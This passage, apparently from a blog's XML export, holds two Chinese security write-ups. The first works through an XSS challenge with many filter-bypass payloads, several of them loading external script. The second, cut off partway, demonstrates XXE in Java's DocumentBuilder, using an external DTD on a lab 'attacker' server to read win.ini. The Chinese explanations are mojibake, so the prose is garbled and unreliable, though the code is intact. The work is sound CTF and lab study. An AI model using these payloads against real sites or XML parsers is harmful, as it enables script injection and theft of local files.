onmouseover="alert(1)"&gt;//é¼ æ ‡ç§»åŠ¨æŒ‡å‘å›¾ç‰‡&lt;img src=javascript: onclick="alert(1)"&gt;//é¼ æ ‡ç‚¹å‡»å›¾ç‰‡ 0x01å…³é”®æºç ï¼š 123function render (input) &#123; return '&lt;textarea&gt;' + input + '&lt;/textarea&gt;'&#125; æ— ä»»ä½•è¿‡æ»¤ç›´æŽ¥å¾€textareaæ ‡ç­¾å†…å†™å†…å®¹ï¼Œç›´æŽ¥å†™å’Œä¸Šé¢ä¸€æ ·çš„payloadæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºè¯¥æ ‡ç­¾å†…è¢«è§£æžä¸ºæ–‡æœ¬å†…å®¹ï¼Œæ–‡æœ¬æ¡†æ˜¯æ— æ³•æ‰§è¡ŒJSä»£ç çš„ï¼Œå› æ­¤éœ€è¦é—­åˆè¯¥textareaæ ‡ç­¾ï¼š 1&lt;/textarea&gt;&lt;svg onload=alert(1)&gt; 0x02å…³é”®æºç ï¼š 123function render (input) &#123; return '&lt;input type="name" value="' + input + '"&gt;'&#125; ç®€å•çš„DOMåž‹XSSï¼Œæ— ä»»ä½•è¿‡æ»¤ç›´æŽ¥å¾€inputæ ‡ç­¾å†…çš„valueå±žæ€§å†™å†…å®¹ï¼Œé—­åˆæŽ‰åŒå¼•å·å’Œå¤§äºŽå·å³å¯ï¼š 1"&gt;&lt;body onload=alert(1)&gt; ä¹Ÿå¯ä»¥å¦‚ä¸‹æž„é€ ï¼Œå½“é¼ æ ‡æŒ‡å‘inputè¾“å…¥æ¡†æ—¶å°±ä¼šæ‰§è¡Œå¼¹æ¡†ï¼š 1" onmouseover="alert(1) 0x03å…³é”®æºç ï¼š 12345function render (input) &#123; const stripBracketsRe = /[()]/g input = input.replace(stripBracketsRe, '') return input&#125; æ­£åˆ™è¿‡æ»¤äº†[]ã€()ç­‰ç¬¦å·ï¼Œé‚£å°±ç”¨åå¼•å·`æ¥æ›¿ä»£()ï¼š 1&lt;img src=x onerror=alert`1`&gt; å½“ç„¶åœ¨æ ‡ç­¾å±žæ€§å†…ä¹Ÿå¯ä»¥ä½¿ç”¨HTMLå®žä½“ç¼–ç ç»•è¿‡ï¼š 1&lt;img src="" onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt; ç›´æŽ¥å¼•ç”¨å¤–éƒ¨jsæ–‡ä»¶åŒæ ·OKï¼š 1&lt;script src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt; 0x04å…³é”®æºç ï¼š 12345function render (input) &#123; const stripBracketsRe = /[()`]/g input = input.replace(stripBracketsRe, '') return input&#125; åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ äº†åå¼•å·`çš„è¿‡æ»¤ï¼Œä½†å‰é¢çš„åŽä¸¤ä¸ªpayloadæ˜¯å¯ä»¥ç”¨çš„ï¼š 12&lt;img src="" onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;script src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt; å½“ç„¶è¿˜æœ‰ä¸‹é¢ä¸€äº›payloadï¼ŒåŒæ ·éƒ½æ˜¯åˆ©ç”¨ç¼–ç ç»•è¿‡ï¼Œåªæ˜¯æ ‡ç­¾ä¸åŒè€Œå·²ï¼š 123&lt;script&gt;window.onerror=eval;throw'=alert\x281\x29'&lt;/script&gt;//åˆ©ç”¨jsæ•èŽ·æŠ›å‡ºé”™è¯¯æ‰§è¡Œå¼¹æ¡†ï¼ŒUnicodeç¼–ç &lt;iframe srcdoc="&lt;script&gt;parent.alert&amp;#40;1&amp;#41;&lt;/script&gt;"&gt;//åˆ©ç”¨HTML5ä¸­iframeçš„ç‰¹ç‚¹ï¼Œå…¶srcdocå±žæ€§é‡Œçš„ä»£ç ä¼šä½œä¸ºiframeä¸­çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼Œsrcdocä¸­å¯ä»¥ç›´æŽ¥åŽ»å†™è½¬è¯‘åŽçš„HTMLç‰‡æ®µ&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script&gt;//svgæ ‡ç­¾å¯ç›´æŽ¥æ‰§è¡Œå®žä½“å­—ç¬¦å³HTMLè½¬ä¹‰å­—ç¬¦ï¼Œè‹¥ä¸æ·»åŠ åœ¨å‰åˆ™åŒ…å«è§£æžscriptæ ‡ç­¾å†…å®¹çš„ç¼–ç å†…å®¹ 0x05å…³é”®æºç ï¼š 1234function render (input) &#123; input = input.replace(/--&gt;/g, 'ðŸ˜‚') return '&lt;!-- ' + input + ' --&gt;'&#125; è¿‡æ»¤äº†â€“&gt;ï¼Œå¹¶å°†è¾“å…¥æ”¾å…¥æ³¨é‡Šä¸­é—´ã€‚ä½†æ˜¯ï¼Œ HTMLæ³¨é‡Šæ”¯æŒä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š &lt;!-- xxx --&gt; &lt;!- xxx -!&gt; &lt;!â€” ä»¥ï¼å¼€å¤´ï¼Œä»¥ï¼ç»“å°¾å¯¹ç§°æ³¨é‡Šçš„æ–¹å¼ â€”!&gt; ç›´æŽ¥å¦‚ä¸‹ç»•è¿‡ï¼š 1--!&gt;&lt;body/onload=alert(1)&gt; 0x06å…³é”®æºç ï¼š 1234function render (input) &#123; input = input.replace(/auto|on.*=|&gt;/ig, '_') return `&lt;input value=1 $&#123;input&#125; type="text"&gt;`&#125; è¿‡æ»¤äº†autoã€å¤§äºŽå·&gt;ã€ä»¥onå¼€å¤´=ç­‰å·ç»“å°¾ï¼Œå°†å…¶æ›¿æ¢æˆ_ï¼Œä¸”å¿½ç•¥å¤§å°å†™ã€‚ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤æ¢è¡Œï¼Œç›´æŽ¥å¯ä»¥æ¢è¡Œç»•è¿‡ã€‚ è¿™é‡Œåˆ©ç”¨inputæ ‡ç­¾çš„onmouseç³»åˆ—å±žæ€§å¼¹æ¡†å³å¯ï¼š 12onmousemove=alert(1) å¦å¤–ï¼Œinputæ ‡ç­¾çš„typeå±žæ€§å¯ä»¥è®¾ç½®ä¸ºimageï¼Œç„¶åŽåˆ©ç”¨ç±»ä¼¼imgæ ‡ç­¾çš„å¥—è·¯æ¥å¼¹æ¡†å³å¯ï¼š 12type="image" src="" onerror=alert(1) 0x07å…³é”®æºç ï¼š 123456function render (input) &#123; const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi input = input.replace(stripTagsRe, '') return `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`&#125; æ­£åˆ™è¿‡æ»¤äº†&lt;&gt;æ‹¬èµ·æ¥çš„å­—ç¬¦ä¸²å†…å®¹ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨å®¹é”™æ€§ï¼Œå°‘æ·»åŠ æœ€åŽä¸€ä¸ªå¤§äºŽå·&gt;ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼š 1&lt;body/onload=alert(1)// å½“ç„¶ï¼Œâ€//â€œå¯ä»¥æ›¿æ¢ä¸ºâ€&lt;!â€“â€æˆ–ç©ºæ ¼æˆ–å›žè½¦ã€‚ 0x08å…³é”®æºç ï¼š 12345678function render (src) &#123; src = src.replace(/&lt;\/style&gt;/ig, '/* \u574F\u4EBA */') return ` &lt;style&gt; $&#123;src&#125; &lt;/style&gt; `&#125; æ­£åˆ™è¿‡æ»¤äº†æƒ³è¦é—­åˆç”¨çš„styleæ ‡ç­¾ï¼Œä¸”å¿½ç•¥å¤§å°å†™ã€‚å’Œå‰é¢çš„ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ ‡ç­¾çš„å¤§äºŽå·&gt;ä¹‹å‰æ·»åŠ ç©ºæ ¼æˆ–æ¢è¡Œæ¥ç»•è¿‡æ‰§è¡Œï¼š 1&lt;/style &gt;&lt;body/onload=alert(1)&gt; 0x09å…³é”®æºç ï¼š 1234567function render (input) &#123; let domainRe = /^https?:\/\/www\.segmentfault\.com/ if (domainRe.test(input)) &#123; return `&lt;script src="$&#123;input&#125;"&gt;&lt;/script&gt;` &#125; return 'Invalid URL'&#125; æ­£åˆ™é™åˆ¶äº†å¿…é¡»ä»¥æŒ‡å®šçš„åŸŸåæ¥å¼€å¤´ï¼Œå¹¶æ”¾ç½®åœ¨scriptæ ‡ç­¾çš„srcå±žæ€§ä¸­ã€‚è¿™é‡Œç›´æŽ¥é—­åˆåŒå¼•å·å’Œscriptæ ‡ç­¾å³å¯ï¼š 12https://www.segmentfault.com"&gt;&lt;/script&gt;&lt;script src="https://xss.haozi.me/j.js 0x0Aå…³é”®æºç ï¼š 12345678910111213141516function render (input) &#123; function escapeHtml(s) &#123; return s.replace(/&amp;/g, '&amp;amp;') .replace(/'/g, '&amp;#39;') .replace(/"/g, '&amp;quot;') .replace(/&lt;/g, '&amp;lt;') .replace(/&gt;/g, '&amp;gt;') .replace(/\//g, '&amp;#x2f') &#125; const domainRe = /^https?:\/\/www\.segmentfault\.com/ if (domainRe.test(input)) &#123; return `&lt;script src="$&#123;escapeHtml(input)&#125;"&gt;&lt;/script&gt;` &#125; return 'Invalid URL'&#125; åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šï¼Œè¿‡æ»¤äº†&amp;ã€â€™ã€â€ã€&lt;&gt;ã€/ç­‰å­—ç¬¦ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸èƒ½é€šè¿‡é—­åˆçš„å½¢å¼æž„é€ payloadæ‰§è¡Œäº†ã€‚ è¿™é‡Œå¯ä»¥åˆ©ç”¨URLçš„@å­—ç¬¦çš„ç‰¹æ€§æ¥è°ƒç”¨å¤–éƒ¨j.jsã€‚ ä¸€èˆ¬çš„ï¼Œå½“æˆ‘ä»¬è®¿é—®http://a.com@b.com å®žé™…æ˜¯è®¿é—®http://b.com è™½ç„¶URLä¸­çš„ç‰¹æ®Šç¬¦å·ä¼šè¢«è¿‡æ»¤ï¼Œä½†è¿‡æ»¤åŽçš„HTMLå®žä½“ç¼–ç åœ¨HTMLæ ‡ç­¾å±žæ€§å€¼ä¸­æ— å½±å“ï¼Œå¯ä»¥ç›´æŽ¥è§£æžæ‰§è¡Œï¼š 1https://www.segmentfault.com@xss.haozi.me/j.js ä½†æ˜¯æˆ‘è¿™é‡Œæ˜¯æ²¡æœ‰æˆåŠŸæ‰§è¡Œçš„ï¼ŒåŽŸå› å¾…ç¡®å®šã€‚ 0x0Bå…³é”®æºç ï¼š 1234function render (input) &#123; input = input.toUpperCase() return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`&#125; å°†è¾“å…¥çš„å­—æ¯å…¨éƒ¨è½¬æ¢æˆå¤§å†™å½¢å¼å°±ç›´æŽ¥ä¼ å…¥h1æ ‡ç­¾ä¸­ã€‚ æœ‰å‡ ä¸ªtipsï¼š htmlæ ‡ç­¾å¤§å°å†™æ— å½±å“ï¼› jsä¸¥æ ¼åŒºåˆ†å¤§å°å†™ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸èƒ½ç›´æŽ¥æž„é€ jsä»£ç æ‰§è¡Œäº†ï¼Œä½†è¿™é‡Œå¯ä»¥åˆ©ç”¨scriptæ ‡ç­¾åŠ è½½j.jsï¼Œå› ä¸ºURLåœ°å€ä¸å—å¤§å°å†™å½±å“ä¸”HTMLæ ‡ç­¾ä¸å—å¤§å°å†™å½±å“ï¼š 1&lt;script src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt; 0x0Cå…³é”®æºç ï¼š 12345function render (input) &#123; input = input.replace(/script/ig, '') input = input.toUpperCase() return '&lt;h1&gt;' + input + '&lt;/h1&gt;'&#125; åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šï¼Œæ›¿æ¢äº†scriptå­—ç¬¦ä¸²ä¸ºç©ºï¼Œä¸”å¿½ç•¥å¤§å°å†™ã€‚ æˆ‘ä»¬å¯ä»¥å†…åµŒscriptæ¥ç»•è¿‡ï¼š 1&lt;scrscriptipt src="https://xss.haozi.me/j.js"&gt;&lt;/scriscriptpt&gt; 0x0Då…³é”®æºç ï¼š 12345678function render (input) &#123; input = input.replace(/[&lt;/"']/g, '') return ` &lt;script&gt; // alert('$&#123;input&#125;') &lt;/script&gt; `&#125; æ­£åˆ™è¿‡æ»¤äº†&lt;ã€/ã€â€ã€â€™ç­‰å­—ç¬¦ä¸ºç©ºï¼Œå†å°†è¾“å…¥ä¼ å…¥scriptæ ‡ç­¾ä¸­æœ‰æ³¨é‡Šç¬¦çš„alert()å†…ã€‚ å…ˆé€šè¿‡æ¢è¡Œç»•è¿‡æ³¨é‡Šç¬¦é™åˆ¶ï¼Œç”¨åå¼•å·`æ›¿æ¢()ï¼Œæœ€åŽæ¢è¡Œæ·»åŠ HTMLæ³¨é‡Š â€“&gt; æ¥æ³¨é‡ŠæŽ‰åŽé¢çš„jsä»£ç ï¼ˆè®°ä½ï¼Œåœ¨â€“&gt;å‰å¿…é¡»æ·»åŠ æ¢è¡Œæ‰ä¼šç”Ÿæ•ˆï¼‰ï¼š 123alert`1`;--&gt; 0x0Eå…³é”®æºç ï¼š 12345function render (input) &#123; input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1') input = input.toUpperCase() return '&lt;h1&gt;' + input + '&lt;/h1&gt;'&#125; æ­£åˆ™è¿‡æ»¤äº†ä»¥â€&lt;â€å¼€å¤´ä¸”ç´§æŽ¥å­—æ¯çš„å­—ç¬¦ä¸²ï¼Œå°†å…¶åœ¨â€&lt;â€ä¸Žå­—æ¯ä¸­é—´æ·»åŠ ä¸‹åˆ’çº¿â€_â€ã€‚ è¿™é¢˜éœ€è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼š1. \&lt;sè¢«æ­£åˆ™æ›¿æ¢åäº†ï¼› 2. å¤§å†™çš„jsæ— æ³•æ­£å¸¸è¿è¡Œã€‚ è¿™ä¸ªç¡®å®žä¸ä¼šæžï¼Œåˆ°ç½‘ä¸Šçœ‹äº†ä¸‹wpï¼Œå‘çŽ°è¿˜æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼šâ€œÅ¿ å¤è‹±è¯­ä¸­çš„sçš„å†™æ³•, è½¬æˆå¤§å†™æ˜¯æ­£å¸¸çš„Sâ€ã€‚ é‚£å°±ç›´æŽ¥å°†ä¹‹å‰payloadçš„sæ›¿æ¢æˆ Å¿ å³å¯ï¼š 1&lt;Å¿cript src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt; 0x0Få…³é”®æºç ï¼š 1234567891011function render (input) &#123; function escapeHtml(s) &#123; return s.replace(/&amp;/g, '&amp;amp;') .replace(/'/g, '&amp;#39;') .replace(/"/g, '&amp;quot;') .replace(/&lt;/g, '&amp;lt;') .replace(/&gt;/g, '&amp;gt;') .replace(/\//g, '&amp;#x2f;') &#125; return `&lt;img src onerror="console.error('$&#123;escapeHtml(input)&#125;')"&gt;`&#125; æ­£åˆ™å¯¹å•åŒå¼•å·ã€&amp;ã€&lt;&gt;ã€/è¿›è¡Œäº†HTMLå®žä½“ç¼–ç ï¼Œå†æ”¾ç½®åˆ°imgæ ‡ç­¾çš„onerrorå±žæ€§ä¸­ã€‚ ä½†æ˜¯ï¼Œå¯¹HTML inline jsè½¬ä¹‰å°±æ˜¯åšæ— ç”¨åŠŸï¼Œæµè§ˆå™¨ä¼šå…ˆè§£æžHTMLï¼Œç„¶åŽå†è§£æžjsã€‚ æˆ‘ä»¬å¯ä»¥ç›´æŽ¥é—­åˆå‰é¢çš„console.error()ï¼Œæ·»åŠ ;åˆ†å·å†æ³¨å…¥alertè¯­å¥å³å¯ï¼š 1234');alert('1æˆ–');alert(1)--&gt; 0x10å…³é”®æºç ï¼š 1234567function render (input) &#123; return `&lt;script&gt; window.data = $&#123;input&#125;&lt;/script&gt; `&#125; ç›´æŽ¥å°†è¾“å…¥æ”¾ç½®åˆ°scriptæ ‡ç­¾çš„window.dataä¸­ã€‚ å¯ä»¥åœ¨å‰é¢é€šè¿‡å¼•å·éšæ„èµ‹å€¼ç»™window.dataï¼Œä»¥åˆ†å·ç»“æŸè¯¥jsè¯­å¥ï¼Œå†æ³¨å…¥alertè¯­å¥å³å¯ï¼š 1"";alert(1) å¯ä»¥é—­åˆæŽ‰scriptæ ‡ç­¾ï¼š 1&lt;/script&gt;&lt;script&gt;alert(1) å¯ä»¥ç›´æŽ¥åœ¨window.dataæ‰§è¡Œå†èµ‹å€¼ï¼š 12345alert(1)æˆ–eval(alert(1))æˆ–eval("alert(1)") 0x11å…³é”®æºç ï¼š 123456789101112131415161718192021222324252627282930// from alf.nufunction render (s) &#123; function escapeJs (s) &#123; return String(s) .replace(/\\/g, '\\\\') .replace(/'/g, '\\\'') .replace(/"/g, '\\"') .replace(/`/g, '\\`') .replace(/&lt;/g, '\\74') .replace(/&gt;/g, '\\76') .replace(/\//g, '\\/') .replace(/\n/g, '\\n') .replace(/\r/g, '\\r') .replace(/\t/g, '\\t') .replace(/\f/g, '\\f') .replace(/\v/g, '\\v') // .replace(/\b/g, '\\b') .replace(/\0/g, '\\0') &#125; s = escapeJs(s) return `&lt;script&gt; var url = 'javascript:console.log("$&#123;s&#125;")' var a = document.createElement('a') a.href = url document.body.appendChild(a) a.click()&lt;/script&gt;`&#125; å¾ˆé•¿çš„ä¸€æ®µè¿‡æ»¤ï¼Œå°†åæ–œæ \ã€å•åŒå¼•å·ã€&lt;&gt;ã€åå¼•å·`ã€æ–œæ /ã€æ¢è¡Œç¬¦\nä¸Ž\rã€tabç¬¦\tã€æ¢é¡µç¬¦\fã€åž‚ç›´åˆ¶è¡¨ç¬¦\vã€ç©ºå­—ç¬¦\Oéƒ½åœ¨å…¶å‰é¢æ·»åŠ åæ–œæ \è¿›è¡Œè½¬ä¹‰ï¼Œæœ€åŽå†æ”¾ç½®åˆ°scriptæ ‡ç­¾ä¸­ã€‚ è¿™é‡Œæ³¨æ„åˆ°console.log(&quot;${s}&quot;)ï¼Œå½“æˆ‘ä»¬è¾“å…¥åŒå¼•å·æ—¶ï¼Œå…¶å®žæ˜¯è¾“å…¥\â€œï¼Œç„¶åŽåˆšåˆšçš„ä»£ç å°±å˜æˆconsole.log(&quot;\&quot;&quot;)ï¼Œè¿™æ ·è¾“å…¥çš„\â€œå‰é¢çš„åæ–œæ \ç›´æŽ¥æ”¾åœ¨åŒå¼•å·ä¸­è¢«å¿½ç•¥æŽ‰äº†ï¼Œèµ·ä¸åˆ°è½¬ä¹‰å­—ç¬¦çš„ä½œç”¨ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ­¤ç›´æŽ¥æž„é€ ï¼š 12345");alert("1æˆ–");alert(1)//æˆ–");alert(1);&lt;!-- ä¸­é—´çš„payloadè™½ç„¶//è¢«è½¬ä¹‰ä¸ºäº†\/\/ï¼Œä½†è½¬ä¹‰ä¹‹åŽè¿˜æ˜¯//ï¼Œä¸å½±å“æ³¨é‡Šæ•ˆæžœã€‚ 0x12å…³é”®æºç ï¼š 12345// from alf.nufunction escape (s) &#123; s = s.replace(/"/g, '\\"') return '&lt;script&gt;console.log("' + s + '");&lt;/script&gt;'&#125; æ­£åˆ™è¿‡æ»¤äº†åŒå¼•å·ï¼Œå°†å…¶æ›¿æ¢ä¸º\\â€œï¼Œå†å°†è¾“å…¥æ”¾ç½®åˆ°scriptæ ‡çš„console.log()ä¸­ã€‚ æµ‹è¯•ä¸€ä¸‹å‘çŽ°ï¼Œå½“æˆ‘ä»¬è¾“å…¥\â€œæ—¶ï¼Œç»è¿‡è½¬ä¹‰åŽä¸ºconsole.log(&quot;\\&quot;&quot;)ï¼Œå³å°†è¿‡æ»¤æ—¶æ·»åŠ çš„è½¬ç§»ç¬¦ç»™è½¬ä¹‰äº†ï¼Œä»Žè€Œç»•è¿‡äº†è½¬ç§»ç¬¦çš„è½¬ä¹‰åŠŸèƒ½ï¼Œå¯æž„é€ å¦‚ä¸‹payloadï¼š 123456\");alert(1)//æˆ–\");alert(1)--&gt;æˆ–\");alert(1)&lt;!-- å¦å¤–ï¼Œç”±äºŽè§£æžHTMLæ ‡ç­¾çš„ä¼˜å…ˆçº§é«˜äºŽè§£æžJSçš„ä¼˜å…ˆçº§ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç›´æŽ¥é—­åˆæ ‡ç­¾ï¼š 1&lt;/script&gt;&lt;script&gt;alert(1)// å°ç»“è¿™æ¬¡çš„ç»ƒä¹ å¤šæ˜¯é’ˆå¯¹æ­£åˆ™çš„ç»•è¿‡ï¼Œå­¦åˆ°ä¸€äº›æ–°å§¿åŠ¿ï¼ŒæŽ¨èç»ƒä¹ ã€‚]]></content>
      <categories>
        <category>WriteUp:Web</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>Webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XMLæ³¨å…¥ä¹‹DocumentBuilder]]></title>
    <url>%2F2019%2F02%2F13%2FXML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder%2F</url>
    <content type="text"><![CDATA[ä½•ä¸ºDocumentBuilderDocumentBuilderæ˜¯Javaä¸­å¸¸ç”¨çš„XMLæ–‡æ¡£è§£æžå·¥å…·ï¼Œæ˜¯åŸºäºŽ DOMï¼ˆDocument Object Modelï¼Œæ–‡æ¡£å¯¹è±¡æ¨¡åž‹ï¼‰çš„è§£æžæ–¹å¼ï¼ŒæŠŠæ•´ä¸ªXMLæ–‡æ¡£åŠ è½½åˆ°å†…å­˜å¹¶è½¬åŒ–æˆDOMæ ‘ï¼Œå› æ­¤åº”ç”¨ç¨‹åºå¯ä»¥éšæœºè®¿é—®DOMæ ‘çš„ä»»ä½•æ•°æ®ã€‚å› æ­¤å…¶ä¼˜ç‚¹æ˜¯çµæ´»æ€§å¼ºã€é€Ÿåº¦å¿«ï¼› ç¼ºç‚¹æ˜¯æ¶ˆè€—èµ„æºæ¯”è¾ƒå¤šã€‚ å¸¸è§„ç”¨æ³•Demoå…ˆå®šä¹‰ä¸€ä¸ªuser.xmlï¼Œç”¨äºŽè®©DocumentBuilderæ¥è§£æžï¼š 123456&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; è§£æžä»£ç ï¼š 123456789101112131415161718192021222324public class test &#123; public static void main(String[] args)&#123; File f = new File("user.xml"); documentBuilder(f); &#125; public static void documentBuilder(File f)&#123; DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance(); try &#123; DocumentBuilder builder=factory.newDocumentBuilder(); //è§£æžxmlæ–‡æ¡£ï¼Œå…ˆèŽ·å– Document doc=builder.parse(f); //é€šè¿‡useråå­—æ¥èŽ·å–domèŠ‚ç‚¹ NodeList nodeList=doc.getElementsByTagName("user"); Element e=(Element)nodeList.item(0); //èŽ·å–å€¼ System.out.println("å§“åï¼š"+e.getElementsByTagName("name").item(0).getFirstChild().getNodeValue()); System.out.println("æ€§åˆ«ï¼š"+e.getElementsByTagName("sex").item(0).getFirstChild().getNodeValue()); System.out.println("å¹´é¾„ï¼š"+e.getElementsByTagName("age").item(0).getFirstChild().getNodeValue()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; è¿è¡ŒåŽï¼Œå‘çŽ°æˆåŠŸè§£æžäº†user.xmlçš„å†…å®¹ï¼š XMLæ³¨å…¥æ¼æ´žéªŒè¯1ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æžDTDï¼šåˆ›å»ºtest.xmlï¼Œå†…å®¹å¦‚ä¸‹ï¼Œä¸»è¦æ·»åŠ äº†DTDå³DOCTYPEï¼š 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; æµ‹è¯•ä»£ç ä¸­å°†user.xmlæ”¹ä¸ºtest.xmlã€‚ è¿è¡Œä»£ç ï¼Œæ•ˆæžœå’ŒDemoä¸€æ ·ï¼Œå³è¯´æ˜Žæ”¯æŒè§£æžDTDã€‚ è¿™é‡Œæ³¨æ„ä¸€ç‚¹ï¼Œå½“è¿›è¡Œçš„æ˜¯é»‘ç›’æµ‹è¯•æ—¶ï¼Œæœªè¿”å›žErrorä¸ä»£è¡¨å°±æ˜¯å¯ä»¥è§£æžXMLï¼Œä½†è¿”å›žErrorå°±è‚¯å®šæ˜¯ä¸æ”¯æŒè§£æžè¯¥XMLï¼ŒåŽŸå› æ˜¯æœåŠ¡ç«¯å¯èƒ½å¯¹Errorè¿›è¡Œäº†å°è£…ã€‚ 2ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æžæ™®é€šå®žä½“ï¼šä¿®æ”¹test.xmlå†…å®¹å¦‚ä¸‹ï¼Œä¸»è¦æ·»åŠ ELEMENTï¼š 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo EMPTY&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; å‘çŽ°å¯ä»¥æ­£å¸¸è§£æžã€‚ 3ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æžå‚æ•°å®žä½“ï¼šä¿®æ”¹test.xmlå†…å®¹å¦‚ä¸‹ï¼Œä¸»è¦ä¿®æ”¹ELEMENTä¸ºENTITYå®žä½“ï¼š 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;&amp;foo;&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; è¿è¡Œä»£ç ï¼Œå‘çŽ°å¯æ­£å¸¸è§£æžï¼Œä¸”æˆåŠŸè¿›è¡Œäº†XMLå®žä½“æ³¨å…¥ï¼š 4ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æžå¤–éƒ¨å®žä½“ï¼šä¿®æ”¹test.xmlå†…å®¹å¦‚ä¸‹ï¼Œä¸»è¦ä¿®æ”¹ä¸ºSYSTEMæ‰§è¡Œè®¿é—®å¤–éƒ¨é“¾æŽ¥ï¼š 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://192.168.17.136:8000/Mi1k7ea.dtd&quot;&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;&amp;tea;&lt;/age&gt;&lt;/user&gt; åœ¨æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆè¿™é‡Œè‡ªå·±å¼€å¯ä¸€ä¸ªWebæœåŠ¡ï¼‰çš„Webç›®å½•æ”¾ç½®ä¸€ä¸ªMi1k7ea.dtdæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œè¯»å–æœ¬åœ°Cç›˜ä¸­çš„win.inié…ç½®æ–‡ä»¶ï¼ˆè‹¥åœ¨Linuxä¸‹è¯»å–â€file:///etc/passwdâ€ä¼šæŠ¥é”™ï¼Œå› ä¸ºè¿™ç§æ”»å‡»æ–¹å¼å—åˆ°XMLä¸­ç¦æ­¢å­—ç¬¦çš„é™åˆ¶ï¼‰ï¼š 1&lt;!ENTITY tea SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; è¿è¡Œä»£ç ï¼Œåœ¨æ”»å‡»è€…æœåŠ¡å™¨çœ‹åˆ°ç›®æ ‡ç¨‹åºè®¿é—®äº†å…¶ä¸­çš„æ¶æ„DTDæ–‡ä»¶ï¼š å‘çŽ°æˆåŠŸé€šè¿‡è¿œç¨‹åŠ è½½è§£æžDTDæ–‡ä»¶è¯»å–äº†æœ¬åœ°æ–‡ä»¶å†…å®¹ï¼š å½“ç„¶ï¼Œå¤–éƒ¨å®žä½“è¿˜æœ‰å¦ä¸€ç§å†™æ³•ï¼Œå¦‚ä¸‹ï¼š 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY % milk SYSTEM &quot;http://192.168.17.136:8000/Mi1k7ea.dtd&quot;&gt; %milk; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;&amp;tea;&lt;/age&gt;&lt;/user&gt; è¿è¡Œç»“æžœå’Œä¸Šé¢æ˜¯ä¸€æ ·çš„ã€‚ è‡³æ­¤ï¼Œæˆ‘ä»¬çŸ¥é“DocumentBuilderæ˜¯å­˜åœ¨XMLæ³¨å…¥é£Žé™©çš„ï¼Œå¹¶ä¸”åœ¨æœªè®¾ç½®æœ‰æ•ˆé˜²å¾¡æŽªæ–½çš„æ—¶å€™å¯æ”¯æŒè§£æžå¤–éƒ¨å®žä½“ï¼Œå³å¯è¿›è¡ŒXMLå¤–éƒ¨å®žä½“æ³¨å…¥æ”»å‡»(XXE)ã€‚ 